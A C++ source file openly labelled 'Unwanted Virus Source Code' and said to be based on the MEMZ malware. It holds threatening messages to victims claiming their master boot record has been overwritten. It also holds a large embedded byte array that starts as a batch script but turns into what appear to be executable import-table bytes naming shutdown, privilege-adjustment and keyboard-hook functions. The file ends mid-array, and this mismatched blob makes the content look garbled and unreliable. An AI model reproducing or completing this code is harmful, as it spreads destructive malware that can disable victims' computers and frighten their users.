/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00,
0x1C, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x49, 0x41, 0x43, 0x00, 0x00, 0x00, 0x20, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x5A,
0x00, 0x00, 0x00, 0x00, 0x24, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x41, 0x00, 0x00, 0x00, 0x00,
0x28, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x50, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x41,
0x00, 0x00, 0x00, 0x00, 0x30, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x5A, 0x00, 0x00, 0x00, 0x00,
0x38, 0x21, 0x00, 0x00, 0x48, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
0x74, 0x61, 0x00, 0x00, 0x80, 0x23, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x73, 0x78, 0x64, 0x61, 0x74,
0x61, 0x00, 0x00, 0x00, 0x84, 0x23, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x00,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62,
0x67, 0x00, 0x00, 0x00, 0x44, 0x26, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,
0x48, 0x26, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63,
0x24, 0x49, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x26, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 0x41,
0x00, 0x00, 0x00, 0x00, 0x50, 0x26, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00,
0x58, 0x26, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61,
0x74, 0x61, 0x24, 0x78, 0x00, 0x00, 0x00, 0x00, 0x94, 0x26, 0x00, 0x00,
0xB4, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32,
0x00, 0x00, 0x00, 0x00, 0x48, 0x27, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00,
0x5C, 0x27, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x60, 0x28, 0x00, 0x00,
0x26, 0x05, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36,
0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x18, 0x30, 0x00, 0x00,
0x7C, 0x03, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00,
0x00, 0x40, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72,
0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x40, 0x00, 0x00,
0x80, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xFE, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xCC, 0xFF, 0xFF, 0xFF,
0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xFF, 0xFF, 0xAD, 0x14, 0x40, 0x00,
0xC1, 0x14, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xFF, 0xFF,
0x00, 0x00, 0x00, 0x00, 0xD8, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
0xFE, 0xFF, 0xFF, 0xFF, 0xCF, 0x17, 0x40, 0x00, 0xE2, 0x17, 0x40, 0x00,
0x70, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xE0, 0x28, 0x00, 0x00, 0x14, 0x20, 0x00, 0x00, 0xBC, 0x27, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x29, 0x00, 0x00,
0x60, 0x20, 0x00, 0x00, 0x5C, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB6, 0x29, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
0xD8, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x1C, 0x2A, 0x00, 0x00, 0x7C, 0x20, 0x00, 0x00, 0x04, 0x28, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x2B, 0x00, 0x00,
0xA8, 0x20, 0x00, 0x00, 0xFC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x12, 0x2C, 0x00, 0x00, 0xA0, 0x20, 0x00, 0x00,
0x54, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x32, 0x2C, 0x00, 0x00, 0xF8, 0x20, 0x00, 0x00, 0xF4, 0x27, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x2C, 0x00, 0x00,
0x98, 0x20, 0x00, 0x00, 0xEC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x74, 0x2C, 0x00, 0x00, 0x90, 0x20, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x29, 0x00, 0x00,
0x74, 0x29, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0x9E, 0x29, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB2, 0x28, 0x00, 0x00, 0xBA, 0x28, 0x00, 0x00,
0xCC, 0x28, 0x00, 0x00, 0x5E, 0x2D, 0x00, 0x00, 0xA2, 0x28, 0x00, 0x00,
0x2E, 0x2D, 0x00, 0x00, 0x18, 0x2D, 0x00, 0x00, 0xFE, 0x2C, 0x00, 0x00,
0xE2, 0x2C, 0x00, 0x00, 0xCE, 0x2C, 0x00, 0x00, 0x92, 0x28, 0x00, 0x00,
0x8A, 0x28, 0x00, 0x00, 0x74, 0x28, 0x00, 0x00, 0x48, 0x2D, 0x00, 0x00,
0x60, 0x28, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x94, 0x2C, 0x00, 0x00,
0x72, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x28, 0x00, 0x00,
0x34, 0x29, 0x00, 0x00, 0x46, 0x29, 0x00, 0x00, 0x02, 0x29, 0x00, 0x00,
0x12, 0x29, 0x00, 0x00, 0x20, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x2A, 0x00, 0x00, 0xF8, 0x29, 0x00, 0x00, 0xDA, 0x29, 0x00, 0x00,
0xC4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x58, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x2A, 0x00, 0x00,
0xC2, 0x2A, 0x00, 0x00, 0x8E, 0x2B, 0x00, 0x00, 0xAA, 0x2B, 0x00, 0x00,
0x20, 0x2B, 0x00, 0x00, 0xFA, 0x2A, 0x00, 0x00, 0xD4, 0x2B, 0x00, 0x00,
0xE4, 0x2B, 0x00, 0x00, 0xA0, 0x2A, 0x00, 0x00, 0x2A, 0x2B, 0x00, 0x00,
0x7E, 0x2A, 0x00, 0x00, 0x16, 0x2B, 0x00, 0x00, 0x64, 0x2A, 0x00, 0x00,
0x08, 0x2B, 0x00, 0x00, 0x40, 0x2A, 0x00, 0x00, 0x2E, 0x2A, 0x00, 0x00,
0xC6, 0x2B, 0x00, 0x00, 0xE4, 0x2A, 0x00, 0x00, 0xDC, 0x2A, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xEC, 0x2A, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x1A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72,
0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00,
0x1F, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x00, 0x00, 0x81, 0x05,
0x53, 0x6C, 0x65, 0x65, 0x70, 0x00, 0xC5, 0x03, 0x4C, 0x6F, 0x61, 0x64,
0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x00, 0xF6, 0x00,
0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
0x00, 0x00, 0x67, 0x00, 0x42, 0x65, 0x65, 0x70, 0x00, 0x00, 0xB1, 0x02,
0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65,
0x73, 0x73, 0x00, 0x00, 0x0A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
0x73, 0x6F, 0x6C, 0x65, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00, 0x00,
0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C,
0x00, 0x00, 0x7D, 0x03, 0x53, 0x65, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F,
0x77, 0x73, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x57, 0x00, 0x0F, 0x01,
0x45, 0x78, 0x69, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x45,
0x78, 0x00, 0x85, 0x03, 0x53, 0x68, 0x6F, 0x77, 0x57, 0x69, 0x6E, 0x64,
0x6F, 0x77, 0x00, 0x00, 0xC5, 0x01, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73,
0x74, 0x65, 0x6D, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x73, 0x00, 0x00,
0x1F, 0x00, 0x43, 0x61, 0x6C, 0x6C, 0x4E, 0x65, 0x78, 0x74, 0x48, 0x6F,
0x6F, 0x6B, 0x45, 0x78, 0x00, 0x00, 0x88, 0x02, 0x4D, 0x65, 0x73, 0x73,
0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x55, 0x53, 0x45, 0x52,
0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x15, 0x02, 0x4F, 0x70,
0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B,
0x65, 0x6E, 0x00, 0x00, 0xD2, 0x00, 0x43, 0x72, 0x79, 0x70, 0x74, 0x47,
0x65, 0x6E, 0x52, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x00, 0x00, 0x1F, 0x00,
0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x50,
0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x00, 0xAF, 0x01,
0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C,
0x65, 0x67, 0x65, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x57, 0x00, 0x41, 0x44,
0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
0x1C, 0x00, 0x5F, 0x5F, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x5F,
0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1D, 0x00,
0x5F, 0x5F, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x5F, 0x65, 0x78,
0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x5F, 0x63, 0x6F, 0x6E, 0x74,
0x65, 0x78, 0x74, 0x00, 0x48, 0x00, 0x6D, 0x65, 0x6D, 0x73, 0x65, 0x74,
0x00, 0x00, 0x35, 0x00, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x5F,
0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x34, 0x5F, 0x63, 0x6F, 0x6D,
0x6D, 0x6F, 0x6E, 0x00, 0x56, 0x43, 0x52, 0x55, 0x4E, 0x54, 0x49, 0x4D,
0x45, 0x31, 0x34, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x42, 0x00,
0x5F, 0x73, 0x65, 0x68, 0x5F, 0x66, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x5F,
0x65, 0x78, 0x65, 0x00, 0x44, 0x00, 0x5F, 0x73, 0x65, 0x74, 0x5F, 0x61,
0x70, 0x70, 0x5F, 0x74, 0x79, 0x70, 0x65, 0x00, 0x2E, 0x00, 0x5F, 0x5F,
0x73, 0x65, 0x74, 0x75, 0x73, 0x65, 0x72, 0x6D, 0x61, 0x74, 0x68, 0x65,
0x72, 0x72, 0x00, 0x00, 0x19, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x66, 0x69,
0x67, 0x75, 0x72, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F,
0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x35, 0x00, 0x5F, 0x69, 0x6E, 0x69,
0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72,
0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65,
0x6E, 0x74, 0x00, 0x00, 0x2A, 0x00, 0x5F, 0x67, 0x65, 0x74, 0x5F, 0x69,
0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F,
0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E,
0x74, 0x00, 0x38, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72,
0x6D, 0x00, 0x39, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72,
0x6D, 0x5F, 0x65, 0x00, 0x58, 0x00, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00,
0x25, 0x00, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x54, 0x00, 0x5F, 0x73,
0x65, 0x74, 0x5F, 0x66, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x00, 0x05, 0x00,
0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x63, 0x00, 0x00,
0x06, 0x00, 0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x76,
0x00, 0x00, 0x17, 0x00, 0x5F, 0x63, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00,
0x16, 0x00, 0x5F, 0x63, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x3F, 0x00,
0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x74, 0x68,
0x72, 0x65, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x5F, 0x65,
0x78, 0x65, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x63, 0x61,
0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x00, 0x00, 0x08, 0x00, 0x5F, 0x63,
0x6F, 0x6E, 0x66, 0x69, 0x67, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x6C,
0x6F, 0x63, 0x61, 0x6C, 0x65, 0x00, 0x16, 0x00, 0x5F, 0x73, 0x65, 0x74,
0x5F, 0x6E, 0x65, 0x77, 0x5F, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x01, 0x00,
0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x63, 0x6F, 0x6D, 0x6D, 0x6F, 0x64, 0x65,
0x00, 0x00, 0x36, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C,
0x69, 0x7A, 0x65, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x74,
0x61, 0x62, 0x6C, 0x65, 0x00, 0x00, 0x3E, 0x00, 0x5F, 0x72, 0x65, 0x67,
0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74,
0x5F, 0x66, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1F, 0x00,
0x5F, 0x63, 0x72, 0x74, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x00,
0x1D, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x66, 0x70,
0x5F, 0x73, 0x00, 0x00, 0x6A, 0x00, 0x74, 0x65, 0x72, 0x6D, 0x69, 0x6E,
0x61, 0x74, 0x65, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77,
0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x72, 0x75, 0x6E, 0x74, 0x69,
0x6D, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C,
0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E,
0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6D, 0x61, 0x74, 0x68, 0x2D, 0x6C, 0x31,
0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70,
0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74,
0x2D, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D,
0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73,
0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6C, 0x6F, 0x63,
0x61, 0x6C, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64,
0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77,
0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x68, 0x65, 0x61, 0x70, 0x2D,
0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
0xB1, 0x05, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45,
0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74,
0x65, 0x72, 0x00, 0x00, 0x71, 0x05, 0x53, 0x65, 0x74, 0x55, 0x6E, 0x68,
0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74,
0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x90, 0x05,
0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F,
0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x89, 0x03, 0x49, 0x73, 0x50, 0x72,
0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75,
0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x4F, 0x04,
0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6F, 0x72, 0x6D,
0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00,
0x1B, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0xEC, 0x02,
0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x54, 0x69, 0x6D,
0x65, 0x41, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x54, 0x69, 0x6D, 0x65, 0x00,
0x66, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
0x53, 0x4C, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x00, 0x82, 0x03,
0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72,
0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x7B, 0x02, 0x47, 0x65, 0x74, 0x4D,
0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x57,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB1, 0x19, 0xBF, 0x44, 0x4E, 0xE6, 0x40, 0xBB,
0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
